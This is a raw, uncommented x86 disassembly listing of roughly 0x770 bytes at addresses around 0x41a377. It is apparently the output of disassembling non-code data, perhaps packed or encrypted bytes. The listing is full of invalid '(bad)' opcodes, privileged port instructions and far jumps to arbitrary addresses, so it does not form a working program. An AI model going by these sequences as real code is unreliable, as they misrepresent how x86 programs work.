  41a377:	add    al,0xae
  41a379:	(bad)  
  41a37a:	lock lds ebp,FWORD PTR [eax+0x62]
  41a37e:	popf   
  41a37f:	xchg   BYTE PTR [eax-0x10],dh
  41a382:	and    al,BYTE PTR [ebp+0x74f39114]
  41a388:	dec    edx
  41a389:	cld    
  41a38a:	jmp    0x29cc10d9
  41a38f:	rcr    BYTE PTR [ebx+0x37],0x36
  41a393:	out    0x30,eax
  41a395:	push   cs
  41a396:	daa    
  41a397:	mov    ecx,0x77bfb039
  41a39c:	into   
  41a39d:	or     BYTE PTR [edi],dh
  41a39f:	jmp    0x3699616e
  41a3a4:	jge    0x41a3d9
  41a3a6:	loope  0x41a3c8
  41a3a8:	in     eax,0x87
  41a3aa:	data16 mov cl,0x3d
  41a3ad:	push   edx
  41a3ae:	js     0x41a3ef
  41a3b0:	ins    DWORD PTR es:[edi],dx
  41a3b1:	std    
  41a3b2:	ret    
  41a3b3:	dec    eax
  41a3b4:	rcr    DWORD PTR [edi-0x3512e72c],0xa3
  41a3bb:	push   ebp
  41a3bc:	adc    ebp,ebx
  41a3be:	adc    eax,0xbdf2b75c
  41a3c3:	loope  0x41a3e0
  41a3c5:	push   edi
  41a3c6:	push   0xffffffd7
  41a3c8:	xchg   ecx,eax
  41a3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ca:	or     DWORD PTR [ecx+0x68],0x50
  41a3ce:	jne    0x41a407
  41a3d0:	or     DWORD PTR [eax+0x3149530f],0xffffff83
  41a3d7:	sbb    al,0x6b
  41a3d9:	test   al,0x54
  41a3db:	stos   BYTE PTR es:[edi],al
  41a3dc:	mov    ds:0x93133c53,al
  41a3e1:	xlat   BYTE PTR ds:[ebx]
  41a3e2:	repnz push 0x68ad1b10
  41a3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3e9:	out    0xb8,eax
  41a3eb:	das    
  41a3ec:	data16 mov dh,0xc6
  41a3ef:	sbb    BYTE PTR [esi+0x7f1b192b],bh
  41a3f5:	popa   
  41a3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f7:	popa   
  41a3f8:	neg    DWORD PTR [esi]
  41a3fa:	push   ebx
  41a3fb:	mov    al,ds:0xe055c3a4
  41a400:	sbb    cl,al
  41a402:	sbb    ch,BYTE PTR [ebx]
  41a404:	jmp    0x7388:0x328fc693
  41a40b:	imul   ebx,DWORD PTR [esi+ebp*1],0xffffff91
  41a40f:	fiadd  WORD PTR [ecx+0x11]
  41a412:	stc    
  41a413:	shr    BYTE PTR [ecx+0x1753a2c2],cl
  41a419:	test   eax,0xa31fa3c7
  41a41e:	out    0x8e,al
  41a420:	add    ebp,DWORD PTR [edx]
  41a422:	ja     0x41a433
  41a424:	retf   0xc8fd
  41a427:	xchg   esi,eax
  41a428:	jp     0x41a422
  41a42a:	add    ecx,DWORD PTR [ecx]
  41a42c:	cs stos BYTE PTR es:[edi],al
  41a42e:	rcpps  xmm6,xmm6
  41a431:	mov    ds:0x69612ffc,eax
  41a436:	pushf  
  41a437:	daa    
  41a438:	shr    BYTE PTR [eax-0x43eb15f0],0x95
  41a43f:	jmp    0x41a415
  41a441:	mov    ah,0x48
  41a443:	fwait
  41a444:	shl    DWORD PTR [ecx],cl
  41a446:	mov    dh,0xd2
  41a448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a449:	loopne 0x41a4ab
  41a44b:	out    dx,al
  41a44c:	xor    ebx,DWORD PTR [ebp-0x69]
  41a44f:	xchg   ebp,eax
  41a450:	repz or edx,DWORD PTR [edi]
  41a453:	out    dx,eax
  41a454:	pop    edi
  41a455:	nop
  41a456:	leave  
  41a457:	jbe    0x41a436
  41a459:	lds    ebx,FWORD PTR [eax]
  41a45b:	gs jbe 0x41a476
  41a45e:	(bad)  
  41a45f:	push   cs
  41a460:	std    
  41a461:	ins    DWORD PTR es:[edi],dx
  41a462:	mov    dh,0x85
  41a464:	add    DWORD PTR [eax-0x79fe2923],ecx
  41a46a:	cdq    
  41a46b:	(bad)  
  41a46c:	out    0xee,eax
  41a46e:	shl    DWORD PTR [ebp+0x77],cl
  41a471:	xchg   ecx,eax
  41a472:	das    
  41a473:	scas   al,BYTE PTR es:[edi]
  41a474:	sbb    BYTE PTR [ecx],al
  41a476:	in     eax,0x9
  41a478:	dec    ecx
  41a479:	xchg   edx,eax
  41a47a:	jge    0x41a42d
  41a47c:	div    DWORD PTR [ecx+ebp*4+0x24c0578c]
  41a483:	out    dx,al
  41a484:	cmp    cl,bh
  41a486:	jb     0x41a465
  41a488:	fwait
  41a489:	lds    ebx,FWORD PTR [ebp-0x5437c2bb]
  41a48f:	retf   0xa65
  41a492:	test   BYTE PTR [ebp+0x3bb69877],0x9a
  41a499:	xchg   edi,eax
  41a49a:	js     0x41a427
  41a49c:	cmp    al,bl
  41a49e:	or     ebx,ecx
  41a4a0:	xchg   ecx,eax
  41a4a1:	into   
  41a4a2:	imul   edi,DWORD PTR ds:0x381c58,0x3c
  41a4a9:	push   es
  41a4aa:	(bad)  
  41a4ab:	loopne 0x41a48a
  41a4ad:	enter  0x5004,0xaa
  41a4b1:	test   eax,0xe48b3ede
  41a4b6:	xor    edx,DWORD PTR [eax-0x1e]
  41a4b9:	dec    ebx
  41a4ba:	jmp    0x27219c3
  41a4bf:	mov    edx,0x2140c893
  41a4c4:	test   al,0x54
  41a4c6:	inc    esp
  41a4c7:	or     DWORD PTR [ebx-0x64bac928],0xe52a021
  41a4d1:	xor    dl,ah
  41a4d3:	sbb    DWORD PTR [edi],esi
  41a4d5:	ret    
  41a4d6:	sub    esp,DWORD PTR [eax+0x45]
  41a4d9:	mov    WORD PTR [edx],gs
  41a4db:	js     0x41a4c8
  41a4dd:	popf   
  41a4de:	lds    ecx,FWORD PTR [edi+edi*2-0x2b]
  41a4e2:	addr16 xor al,0x76
  41a4e5:	cmp    eax,0x394b5998
  41a4ea:	aam    0x27
  41a4ec:	and    eax,0xd567ab6
  41a4f1:	das    
  41a4f2:	js     0x41a47e
  41a4f4:	call   FWORD PTR [eax-0x4d]
  41a4f7:	repnz loop 0x41a4bd
  41a4fa:	imul   ebx,DWORD PTR [bp+di],0x14
  41a4fe:	(bad)
  41a501:	std    
  41a502:	aad    0x8b
  41a504:	fwait
  41a505:	xchg   ecx,eax
  41a506:	pop    edi
  41a507:	clc    
  41a508:	das    
  41a509:	out    0xae,eax
  41a50b:	dec    ebx
  41a50c:	loope  0x41a4c3
  41a50e:	das    
  41a50f:	mov    edi,DWORD PTR [edi+0x31c7a317]
  41a515:	inc    esi
  41a516:	add    esi,esi
  41a518:	jo     0x41a505
  41a51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a51b:	addr16 jae 0x41a568
  41a51e:	lahf   
  41a51f:	adc    ebx,eax
  41a521:	fwait
  41a522:	pop    ebx
  41a523:	pushf  
  41a524:	sub    bl,dh
  41a526:	push   edx
  41a527:	adc    BYTE PTR [ebx],ch
  41a529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a52a:	pop    ecx
  41a52b:	add    ch,BYTE PTR [edx+0x6c]
  41a52e:	add    edi,0xffffff82
  41a531:	addr16 jmp 0x5b89:0x1a13f577
  41a539:	or     al,0x83
  41a53b:	xor    al,BYTE PTR [edx+0x67426f68]
  41a541:	out    dx,al
  41a542:	sub    BYTE PTR [eax+0x7b],ah
  41a545:	sbb    al,0x94
  41a547:	ror    BYTE PTR [ecx-0x3c3eef05],1
  41a54d:	add    eax,0x86ebacdb
  41a552:	pop    edi
  41a553:	push   es
  41a554:	sbb    ebp,esi
  41a556:	outs   dx,BYTE PTR ds:[esi]
  41a557:	push   edi
  41a558:	lds    esp,FWORD PTR [edx+eiz*1+0x63]
  41a55c:	pop    esi
  41a55d:	in     eax,0x46
  41a55f:	adc    edx,edx
  41a561:	fist   WORD PTR ds:0x7e766611
  41a567:	adc    eax,0x3b6d7c31
  41a56c:	push   edi
  41a56d:	ret    
  41a56e:	ins    BYTE PTR es:[edi],dx
  41a56f:	rcl    DWORD PTR [esi],0x2d
  41a572:	cmc    
  41a573:	int    0xe8
  41a575:	pop    ds
  41a576:	cmc    
  41a577:	mov    dl,0x72
  41a579:	jle    0x41a542
  41a57b:	shr    DWORD PTR [eax+0x1d],cl
  41a57e:	ret    0xccb8
  41a581:	sub    esp,esp
  41a583:	sahf   
  41a584:	mov    esi,0x182c1e2a
  41a589:	data16 stos BYTE PTR es:[edi],al
  41a58b:	sbb    ah,BYTE PTR [ebx]
  41a58d:	mov    al,ah
  41a58f:	add    eax,0x55f1ed3c
  41a594:	lahf   
  41a595:	mov    ebp,0x5f5ac3cd
  41a59a:	add    eax,0xa857931b
  41a59f:	outs   dx,BYTE PTR ds:[esi]
  41a5a0:	xlat   BYTE PTR ds:[ebx]
  41a5a1:	out    0x75,eax
  41a5a3:	retf   
  41a5a4:	cwde   
  41a5a5:	dec    ebp
  41a5a6:	push   ebp
  41a5a7:	fs push ebx
  41a5a9:	or     eax,0x68edc972
  41a5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5af:	inc    eax
  41a5b0:	out    0xd6,al
  41a5b2:	ds jno 0x41a54a
  41a5b5:	stos   BYTE PTR es:[edi],al
  41a5b6:	in     al,0x96
  41a5b8:	test   DWORD PTR [edi-0x33],ecx
  41a5bb:	std    
  41a5bc:	add    edi,eax
  41a5be:	pop    ebp
  41a5bf:	repnz and esp,edx
  41a5c2:	mov    ds:0x85ec3ecf,al
  41a5c7:	mov    esi,0x365ab092
  41a5cc:	aad    0x50
  41a5ce:	dec    ebp
  41a5cf:	cmp    BYTE PTR [eax],dh
  41a5d1:	test   eax,0xb556994
  41a5d6:	out    dx,eax
  41a5d7:	mov    cl,0xa4
  41a5d9:	ret    0x2e1d
  41a5dc:	shr    al,cl
  41a5de:	adc    eax,0x948b39e5
  41a5e3:	outs   dx,DWORD PTR ds:[esi]
  41a5e4:	push   es
  41a5e5:	cs cmp eax,0xae7cfd0a
  41a5eb:	sub    edi,DWORD PTR [eax+0x65394e43]
  41a5f1:	stos   DWORD PTR es:[edi],eax
  41a5f2:	popa   
  41a5f3:	adc    DWORD PTR ss:[edi-0x50],0x8c82f25
  41a5fb:	pop    ebx
  41a5fc:	sbb    DWORD PTR [ecx],eax
  41a5fe:	test   BYTE PTR [ebx-0x4f72482e],dl
  41a604:	push   ebx
  41a605:	add    al,dh
  41a607:	das    
  41a608:	pop    edx
  41a609:	push   0x5a2a4387
  41a60e:	xor    eax,0x29f75762
  41a613:	mov    BYTE PTR [ecx],dh
  41a615:	push   ebp
  41a616:	stc    
  41a617:	jg     0x41a5a6
  41a619:	fdivr  DWORD PTR [edx]
  41a61b:	adc    DWORD PTR [ebp-0x67],edx
  41a61e:	xchg   DWORD PTR [ebp+0x8],ebp
  41a621:	ins    DWORD PTR es:[edi],dx
  41a622:	inc    ebp
  41a623:	imul   esi,ecx,0x14
  41a626:	push   esp
  41a627:	fiadd  WORD PTR [eax+ebx*4-0xf]
  41a62b:	popf   
  41a62c:	les    edi,FWORD PTR [edx-0x12]
  41a62f:	jle    0x41a627
  41a631:	mov    ds:0xcd745d82,eax
  41a636:	ret    
  41a637:	nop
  41a638:	jae    0x41a5cc
  41a63a:	jo     0x41a63f
  41a63c:	(bad)  
  41a63d:	mov    dh,0x3f
  41a63f:	call   0xc28d:0x5e4d6cac
  41a646:	pop    edi
  41a647:	jbe    0x41a61f
  41a649:	xor    ecx,edi
  41a64b:	icebp  
  41a64c:	pop    edi
  41a64d:	sub    eax,0xb5613c17
  41a652:	mov    eax,0x1db56402
  41a657:	es jmp 0x7fd7:0x783fded7
  41a65f:	mov    WORD PTR [edx+0x320b8f6c],gs
  41a665:	push   ebx
  41a666:	and    al,0x94
  41a668:	mov    cs,WORD PTR [esi]
  41a66a:	dec    edi
  41a66b:	repnz pushw cs
  41a66e:	out    dx,eax
  41a66f:	test   al,0x78
  41a671:	or     edi,DWORD PTR [ecx+0x24]
  41a674:	jns    0x41a6e9
  41a676:	push   edx
  41a677:	imul   esp,ecx,0xffffffe3
  41a67a:	pushf  
  41a67b:	sub    edi,esp
  41a67d:	imul   ecx,DWORD PTR [ebp+eax*4+0x23429a1],0x51ead128
  41a688:	push   fs
  41a68a:	push   es
  41a68b:	sub    al,al
  41a68d:	cmp    BYTE PTR [edi+edi*4+0x11],al
  41a691:	aas    
  41a692:	jmp    0x9bfe:0x96fc2279
  41a699:	pop    esp
  41a69a:	scas   eax,DWORD PTR es:[edi]
  41a69b:	es retf 0x3b3b
  41a69f:	loope  0x41a70a
  41a6a1:	sar    edx,1
  41a6a3:	adc    esp,ecx
  41a6a5:	stc    
  41a6a6:	shr    DWORD PTR [esi+0x5ccd66fc],0xdd
  41a6ad:	push   ebp
  41a6ae:	and    edi,edi
  41a6b0:	push   ebx
  41a6b1:	xor    dh,BYTE PTR [ebx-0xc64118b]
  41a6b7:	jle    0x41a649
  41a6b9:	jae    0x41a6fc
  41a6bb:	pusha  
  41a6bc:	xor    eax,0x33ecbd90
  41a6c1:	test   eax,0x80c0a11a
  41a6c6:	iret   
  41a6c7:	data16 ins BYTE PTR es:[edi],dx
  41a6c9:	mov    edx,0xc522dd2c
  41a6ce:	add    edi,esp
  41a6d0:	stos   DWORD PTR es:[edi],eax
  41a6d1:	fcom   QWORD PTR [ecx-0x3bcc9f59]
  41a6d7:	add    esp,esi
  41a6d9:	add    eax,0x212c3d03
  41a6de:	cli    
  41a6df:	and    al,0xd8
  41a6e1:	loopne 0x41a75d
  41a6e3:	mov    eax,gs
  41a6e5:	push   edi
  41a6e6:	rol    DWORD PTR [edi],cl
  41a6e8:	(bad)  [ebp+0xf9db214]
  41a6ee:	push   ebx
  41a6ef:	inc    esp
  41a6f0:	push   edi
  41a6f1:	(bad)  
  41a6f3:	ins    DWORD PTR es:[edi],dx
  41a6f4:	mov    bl,0xda
  41a6f6:	or     bh,BYTE PTR [ebx]
  41a6f8:	push   edi
  41a6f9:	pusha  
  41a6fa:	out    0x92,al
  41a6fc:	fcomp  st(3)
  41a6fe:	mov    cl,0x68
  41a700:	xchg   esp,eax
  41a701:	in     eax,dx
  41a702:	jmp    0x41a69c
  41a704:	jnp    0x41a748
  41a706:	mov    dl,0x24
  41a708:	fsubr  QWORD PTR [esi-0x55]
  41a70b:	inc    ebx
  41a70c:	sub    esp,ecx
  41a70e:	xchg   ecx,eax
  41a70f:	stos   DWORD PTR es:[edi],eax
  41a710:	adc    BYTE PTR [edi+eax*8-0x70],ah
  41a714:	xchg   edx,eax
  41a715:	loop   0x41a766
  41a717:	and    al,0xd
  41a719:	in     eax,0x18
  41a71b:	xchg   BYTE PTR [ebp-0x21],cl
  41a71e:	clc    
  41a71f:	ja     0x41a747
  41a721:	or     eax,0x88a987a5
  41a726:	adc    DWORD PTR [ebp+0x2f],eax
  41a729:	jmp    0x38d1cbe9
  41a72e:	xchg   esp,eax
  41a72f:	inc    esp
  41a730:	ins    DWORD PTR es:[edi],dx
  41a731:	aad    0xb
  41a733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a734:	add    al,0xb2
  41a736:	xor    BYTE PTR [ebx+eiz*1],ah
  41a739:	in     eax,dx
  41a73a:	jl     0x41a6d0
  41a73c:	pop    edx
  41a73d:	test   al,0xf7
  41a73f:	stos   BYTE PTR es:[edi],al
  41a740:	ja     0x41a78f
  41a742:	add    BYTE PTR [edi],bh
  41a744:	test   al,0x7e
  41a746:	hlt    
  41a747:	and    BYTE PTR [edx],bh
  41a749:	push   edx
  41a74a:	pop    ecx
  41a74b:	fwait
  41a74c:	aas    
  41a74d:	push   ds
  41a74e:	imul   edi,DWORD PTR [edx],0x4b
  41a751:	xor    DWORD PTR [ecx-0x3],ebx
  41a754:	scas   al,BYTE PTR es:[edi]
  41a755:	jmp    0x41a753
  41a757:	retf   
  41a758:	cmc    
  41a759:	repnz fldcw WORD PTR [edi+0x2fe39b21]
  41a760:	gs pop ss
  41a762:	dec    ebp
  41a763:	outs   dx,BYTE PTR ds:[esi]
  41a764:	imul   al
  41a766:	pusha  
  41a767:	cmp    DWORD PTR [ecx],ebx
  41a769:	mov    eax,ds:0x125cf3cd
  41a76e:	sbb    ecx,edx
  41a770:	jmp    0x1f1f:0xd9c7b1b2
  41a777:	icebp  
  41a778:	test   eax,0x46b8bc85
  41a77d:	(bad)  
  41a77e:	jmp    0x8c098d08
  41a783:	retf   
  41a784:	jb     0x41a757
  41a786:	pusha  
  41a787:	clc    
  41a788:	inc    eax
  41a789:	stos   BYTE PTR es:[edi],al
  41a78a:	xchg   ebx,eax
  41a78b:	or     al,0xb9
  41a78d:	cs sbb eax,0xeb3ffa07
  41a793:	inc    esi
  41a794:	lods   al,BYTE PTR ds:[esi]
  41a795:	push   esp
  41a796:	push   esi
  41a797:	aam    0xde
  41a799:	adc    bh,BYTE PTR [eax-0xf11ebeb]
  41a79f:	mov    ds:0x9110342c,eax
  41a7a4:	inc    esi
  41a7a5:	mov    bl,0x3b
  41a7a7:	cmp    bl,BYTE PTR [edi]
  41a7a9:	fistp  DWORD PTR [edi+ebx*4-0x511fa36a]
  41a7b0:	pop    ds
  41a7b1:	dec    esi
  41a7b2:	outs   dx,BYTE PTR ds:[esi]
  41a7b3:	stc    
  41a7b4:	scas   eax,DWORD PTR es:[edi]
  41a7b5:	dec    esp
  41a7b6:	push   edx
  41a7b7:	pop    esp
  41a7b8:	inc    edi
  41a7b9:	sub    esp,DWORD PTR [eax-0x272535a7]
  41a7bf:	cmp    al,0xeb
  41a7c1:	icebp  
  41a7c2:	push   ebx
  41a7c3:	jmp    0x5603:0xa455c1b
  41a7ca:	in     al,0x11
  41a7cc:	xor    al,0x83
  41a7ce:	out    0x22,eax
  41a7d0:	push   es
  41a7d1:	pop    ebp
  41a7d2:	mov    ebx,0xa57dcd90
  41a7d7:	lahf   
  41a7d8:	aam    0x2b
  41a7da:	pop    esi
  41a7db:	sbb    DWORD PTR [ecx+0x40],ebp
  41a7de:	and    DWORD PTR [esi],edi
  41a7e0:	(bad)  
  41a7e1:	jns    0x41a76a
  41a7e3:	idiv   ecx
  41a7e5:	cmp    ecx,DWORD PTR [ebx-0x35]
  41a7e8:	into   
  41a7e9:	mov    eax,ds:0x9650f5ce
  41a7ee:	pop    esp
  41a7ef:	mov    al,0x99
  41a7f1:	mov    WORD PTR [edx+ebp*1],?
  41a7f4:	pop    ss
  41a7f5:	and    ebp,esp
  41a7f7:	and    eax,0x561eebcf
  41a7fc:	out    dx,eax
  41a7fd:	outs   dx,BYTE PTR ds:[esi]
  41a7fe:	faddp  st(1),st
  41a800:	push   0x1e
  41a802:	sbb    ch,BYTE PTR [edi+0x19]
  41a805:	jmp    0x41a806
  41a807:	sub    BYTE PTR ss:[edx+0x7e],bh
  41a80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a80c:	sub    al,0x10
  41a80e:	push   cs
  41a80f:	mov    bl,0x80
  41a811:	or     DWORD PTR [ebp-0x5a],edi
  41a814:	jmp    0xefec:0xfb7cf278
  41a81b:	push   ebp
  41a81c:	fstp   QWORD PTR [eax]
  41a81e:	ja     0x41a7ab
  41a820:	mov    ah,0x40
  41a822:	and    esi,ebx
  41a824:	adc    dl,ah
  41a826:	mov    cl,0x2b
  41a828:	ss jle 0x41a863
  41a82b:	xchg   DWORD PTR [ecx+0x6e],edi
  41a82e:	int3   
  41a82f:	movntps XMMWORD PTR [eax+0x53],xmm1
  41a833:	push   esp
  41a834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a835:	mov    ebx,?
  41a837:	cmc    
  41a838:	fdivr  st(6),st
  41a83a:	dec    eax
  41a83b:	xor    bh,al
  41a83d:	fwait
  41a83e:	add    al,0x80
  41a840:	push   0xc193535a
  41a845:	push   ds
  41a846:	mov    DWORD PTR [ebp-0x206d5414],ebp
  41a84c:	mov    ah,0xa9
  41a84e:	in     al,0xb
  41a850:	retf   0xcdd3
  41a853:	add    DWORD PTR [esi-0xe],esp
  41a856:	push   eax
  41a857:	push   edx
  41a858:	mov    al,ds:0xe7e1100b
  41a85d:	mov    edi,0x1a22bba9
  41a862:	sbb    BYTE PTR [edi+0x63],0xf5
  41a866:	inc    esi
  41a867:	hlt    
  41a868:	inc    ebp
  41a869:	test   eax,0x59639fc8
  41a86e:	and    ch,BYTE PTR [ebp+0x3b]
  41a871:	imul   edx,ebx,0x8903c694
  41a877:	or     al,dl
  41a879:	call   0xd4fa:0x7d68591d
  41a880:	ss call 0xbd1df31e
  41a886:	outs   dx,DWORD PTR ds:[esi]
  41a887:	test   al,0xc6
  41a889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a88a:	retf   0xe965
  41a88d:	mov    al,ds:0x95e7b545
  41a892:	pop    eax
  41a893:	sbb    ebx,DWORD PTR [ecx+0x3978a524]
  41a899:	dec    ebp
  41a89a:	xor    bl,0x87
  41a89d:	sub    dh,BYTE PTR [esi-0x48]
  41a8a0:	stos   BYTE PTR es:[edi],al
  41a8a1:	nop
  41a8a2:	lods   al,BYTE PTR ds:[esi]
  41a8a3:	lea    ecx,[edi-0x41]
  41a8a6:	cmp    BYTE PTR [ebx-0x64cf1480],ah
  41a8ac:	xor    BYTE PTR [ecx-0x65bb3ec3],al
  41a8b2:	pop    ecx
  41a8b3:	push   DWORD PTR [esi]
  41a8b5:	pop    eax
  41a8b6:	fist   WORD PTR [eax]
  41a8b8:	mov    al,0x31
  41a8ba:	inc    edi
  41a8bb:	mov    BYTE PTR [ebp+0x51],cl
  41a8be:	loope  0x41a8c5
  41a8c0:	mov    ebp,0x61357b06
  41a8c5:	sub    ecx,esi
  41a8c7:	rol    BYTE PTR [eax+0x641f0a99],cl
  41a8cd:	add    DWORD PTR [edi-0x14],0xffffffc0
  41a8d1:	mov    edi,0x7590f240
  41a8d6:	sbb    bh,BYTE PTR [edi]
  41a8d8:	add    DWORD PTR [edi-0x6159a7da],ecx
  41a8de:	imul   ecx,DWORD PTR [ebp+0x76],0x68cde56e
  41a8e5:	aad    0x5b
  41a8e7:	dec    esi
  41a8e8:	je     0x41a882
  41a8ea:	adc    esp,edi
  41a8ec:	pusha  
  41a8ed:	lock sub ch,0xf4
  41a8f1:	mov    dl,BYTE PTR [edx]
  41a8f3:	jns    0x41a8ec
  41a8f5:	inc    eax
  41a8f6:	or     eax,0x3e75d109
  41a8fb:	add    eax,0x190768c0
  41a900:	adc    DWORD PTR [edi-0x79],esi
  41a903:	mov    ecx,0x5e5dae9f
  41a908:	ret    0x5bf5
  41a90b:	push   ebp
  41a90c:	popf   
  41a90d:	jp     0x41a909
  41a90f:	repnz fprem1 
  41a912:	(bad)  
  41a913:	and    bl,dh
  41a915:	fstp   DWORD PTR [ebx]
  41a917:	add    al,0x1d
  41a919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a91a:	imul   ebx,DWORD PTR [esi+0x56b7a90],0x84b5804b
  41a924:	ficomp WORD PTR [ebx+edx*4-0x48874f03]
  41a92b:	and    DWORD PTR [eax+0x5b6f6b70],ebp
  41a931:	mov    edi,0xb3aa6479
  41a936:	mov    bl,0x15
  41a938:	mov    dh,0x94
  41a93a:	fucomp st(1)
  41a93c:	or     ch,dl
  41a93e:	xchg   ebp,eax
  41a93f:	aas    
  41a940:	pop    esi
  41a941:	add    DWORD PTR [ebp+0x70cde7d6],esi
  41a947:	scas   eax,DWORD PTR es:[edi]
  41a948:	sti    
  41a949:	jmp    0x9ea7:0x7de06813
  41a950:	loope  0x41a947
  41a952:	inc    esp
  41a953:	test   cl,dl
  41a955:	mov    ?,esp
  41a957:	push   0xe5d1047c
  41a95c:	cwde   
  41a95d:	aad    0x79
  41a95f:	das    
  41a960:	xor    BYTE PTR [edx+0x5402902a],0x65
  41a967:	div    DWORD PTR [esp+ebp*4+0x69]
  41a96b:	push   ds
  41a96c:	das    
  41a96d:	pop    edx
  41a96e:	and    cl,0x3c
  41a971:	adc    al,0xf3
  41a973:	adc    eax,0x65015501
  41a978:	or     DWORD PTR [ebx],edx
  41a97a:	xor    eax,0xd23c5c02
  41a97f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a980:	jg     0x41a906
  41a982:	cli    
  41a983:	push   edx
  41a984:	jecxz  0x41a9fb
  41a986:	xor    ch,BYTE PTR ds:0x4fd9f6a1
  41a98c:	dec    esp
  41a98d:	rcr    BYTE PTR [ebx],0x26
  41a990:	jnp    0x41a939
  41a992:	or     al,0x8c
  41a994:	imul   ecx,DWORD PTR [edi-0x1c3b8e69],0x6a
  41a99b:	sub    al,0x8b
  41a99d:	mov    ecx,0x8b54c495
  41a9a2:	stos   DWORD PTR es:[edi],eax
  41a9a3:	or     eax,0x6cf9b483
  41a9a8:	mov    ds:0x63f037ef,eax
  41a9ad:	or     ch,BYTE PTR [edx+0x7fa63bc]
  41a9b3:	(bad)  
  41a9b5:	push   es
  41a9b6:	push   es
  41a9b7:	jno    0x41a9b4
  41a9b9:	pop    ebx
  41a9ba:	pop    ds
  41a9bb:	mov    eax,0x252e1dd5
  41a9c0:	cmp    DWORD PTR [eax],esp
  41a9c2:	das    
  41a9c3:	xor    bl,BYTE PTR [ecx-0x28195ba1]
  41a9c9:	mov    esi,0x8b80cd20
  41a9ce:	add    BYTE PTR [eax-0x67],dl
  41a9d1:	push   ebp
  41a9d2:	popa   
  41a9d3:	aas    
  41a9d4:	and    ah,ch
  41a9d6:	inc    edx
  41a9d7:	mov    ch,0xd9
  41a9d9:	dec    esi
  41a9da:	adc    ebx,edi
  41a9dc:	mov    al,ds:0x561a8cd1
  41a9e1:	outs   dx,BYTE PTR ds:[esi]
  41a9e2:	lds    ecx,FWORD PTR ds:0xa5d11c07
  41a9e8:	sar    BYTE PTR [ebp+0x5eae0458],0xfb
  41a9ef:	push   esp
  41a9f0:	(bad)  
  41a9f1:	mov    ch,0x64
  41a9f3:	nop
  41a9f4:	mul    ebx
  41a9f6:	jge    0x41aa73
  41a9f8:	dec    ebx
  41a9f9:	mov    BYTE PTR [esi],dh
  41a9fb:	es leave 
  41a9fd:	jmp    0x53c22607
  41aa02:	fcmove st,st(1)
  41aa04:	idiv   BYTE PTR [edi]
  41aa06:	xor    esp,0xffffffd2
  41aa09:	fst    DWORD PTR [esi]
  41aa0b:	clc    
  41aa0c:	push   ds
  41aa0d:	(bad)  
  41aa0e:	imul   edi,DWORD PTR [edi-0x4ffa6a20],0x3d0a8125
  41aa18:	push   0xd9425f7c
  41aa1d:	dec    esp
  41aa1e:	pop    ss
  41aa1f:	(bad)  
  41aa20:	repz mov ebp,0x41dcf4c6
  41aa26:	cdq    
  41aa27:	clc    
  41aa28:	jb     0x41aa2a
  41aa2a:	mov    ch,0x48
  41aa2c:	pop    eax
  41aa2d:	jmp    0xbbc0:0x8539c642
  41aa34:	mov    dh,0xe0
  41aa36:	clc    
  41aa37:	jb     0x41a9bf
  41aa39:	mov    ds:0xecf7cb10,eax
  41aa3e:	ret    
  41aa3f:	mov    ecx,0x7962273c
  41aa44:	and    eax,0x1a31bb05
  41aa49:	xlat   BYTE PTR ds:[ebx]
  41aa4a:	stos   DWORD PTR es:[edi],eax
  41aa4b:	and    DWORD PTR [esi],esi
  41aa4d:	loopne 0x41aa91
  41aa4f:	xor    DWORD PTR [ecx+0x7],0x49c35b65
  41aa56:	mov    ecx,DWORD PTR [eax+0x51]
  41aa59:	dec    edi
  41aa5a:	push   ecx
  41aa5b:	mov    al,0x6f
  41aa5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa5e:	dec    eax
  41aa5f:	addr16 dec ebp
  41aa61:	add    bh,BYTE PTR [edx-0x35b0ce1f]
  41aa67:	fs jg  0x41aa07
  41aa6a:	addr16 push es
  41aa6c:	loop   0x41aa8b
  41aa6e:	sbb    eax,0x7bea9e01
  41aa73:	jmp    0x3dcb45dc
  41aa78:	aam    0xc7
  41aa7a:	xor    DWORD PTR [edx+eiz*4+0x626de2a5],ebp
  41aa81:	mov    ch,dl
  41aa83:	mov    al,0x81
  41aa85:	in     al,0x3d
  41aa87:	mov    BYTE PTR [eax],al
  41aa89:	fsubr  DWORD PTR ds:0x8d2c0237
  41aa8f:	adc    ecx,DWORD PTR ds:0xd83f4f6b
  41aa95:	adc    edi,DWORD PTR [esp+ebx*2]
  41aa98:	add    DWORD PTR ds:0xb8f2522,eax
  41aa9e:	pop    ss
  41aa9f:	xor    bl,ch
  41aaa1:	clc    
  41aaa2:	jmp    0x39399feb
  41aaa7:	test   BYTE PTR [ebx+0x3c],al
  41aaaa:	cmp    BYTE PTR [esi-0x686298ee],dh
  41aab0:	push   ebp
  41aab1:	fcom   st(6)
  41aab3:	mov    dh,0xff
  41aab5:	clts   
  41aab7:	shr    BYTE PTR ss:[edi-0x72],cl
  41aabb:	(bad)  
  41aabc:	mov    al,0x6c
  41aabe:	mov    cl,0xb8
  41aac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aac1:	stos   DWORD PTR es:[edi],eax
  41aac2:	sbb    bl,BYTE PTR [ebp-0x7631faf]
  41aac8:	scas   al,BYTE PTR es:[edi]
  41aac9:	dec    eax
  41aaca:	loope  0x41aadb
  41aacc:	mov    ebx,0x8087deef
  41aad1:	nop
  41aad2:	fs in  eax,0x95
  41aad5:	int    0x4c
  41aad7:	push   ecx
  41aad8:	imul   ecx,edx,0xffffffbd
  41aadb:	int    0xc7
  41aadd:	test   BYTE PTR gs:[edi+0x6f],bl
  41aae1:	mov    eax,0x1e341e61
  41aae6:	adc    ebp,ebp
  41aae8:	inc    ebp
  41aae9:	dec    esp
